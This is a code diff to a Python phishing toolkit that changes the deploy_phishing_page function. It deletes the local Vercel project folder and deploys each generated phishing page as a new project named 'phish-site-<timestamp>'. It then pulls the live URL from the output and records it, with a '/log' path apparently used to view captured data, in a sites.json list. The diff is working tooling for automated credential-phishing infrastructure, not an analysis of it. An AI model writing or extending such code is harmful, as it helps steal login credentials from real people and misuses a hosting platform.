@@ -101,36 +101,61 @@ def generate_phishing_page(login_url):
 
 
 def deploy_phishing_page(result):
-    # Run the command and capture the output
-    output = subprocess.check_output(VERCEL_DEPLOY_CMD, shell=True)
-
-    # Convert the output to a string
+    import re
+    import time
+    import os
+    import shutil
+    
+    # Delete .vercel directory to force a new project creation
+    vercel_dir = 'build/.vercel'
+    if os.path.exists(vercel_dir):
+        shutil.rmtree(vercel_dir)
+    
+    # Generate unique project name
+    timestamp = str(int(time.time()))
+    project_name = f"phish-site-{timestamp}"
+    
+    # Deploy with new project name
+    deploy_cmd = f"vercel deploy --prod --cwd build --yes --name {project_name}"
+    output = subprocess.check_output(deploy_cmd, shell=True)
     output = output.decode()
-
-    # Extract the deployment URL from the output
-    url_start = output.find("https://")
-    url_end = output.find("\n", url_start)
-    url = output[url_start:url_end]
-    url += 'p'
-
-    # Print the output
+    
     print(output)
-
+    
+    # Extract the domain URL (format: project-name-hash.vercel.app or project-name.vercel.app)
+    # Look for the production domain in the output
+    domain_pattern = r'https://([a-z0-9-]+\.vercel\.app)'
+    matches = re.findall(domain_pattern, output)
+    
+    if matches:
+        # Get the domain (not the deployment URL)
+        domain = matches[-1]  # Last match is usually the production domain
+        url = f"https://{domain}"
+    else:
+        # Fallback: extract any vercel URL
+        url_start = output.find("https://")
+        url_end = output.find("\n", url_start)
+        url = output[url_start:url_end].strip()
+    
     # Add the newly deployed site's entry to the sites.json db
-    with open('sites.json', 'r') as f:
-        data = json.load(f)
+    try:
+        with open('sites.json', 'r') as f:
+            data = json.load(f)
+    except FileNotFoundError:
+        data = []
 
     new_site = {
         "id": len(data) + 1,
         "url": url,
-        "log_url": url + "/logs",
-        "creation_date": str(datetime.date.today())
+        "log_url": f"{url}/log",
+        "creation_date": str(datetime.date.today()),
+        "project_name": project_name
     }
 
     data.append(new_site)
 
     with open('sites.json', 'w') as f:
-        json.dump(data, f)
+        json.dump(data, f, indent=2)
 
     # Return the deployment URL
     result.append(url)
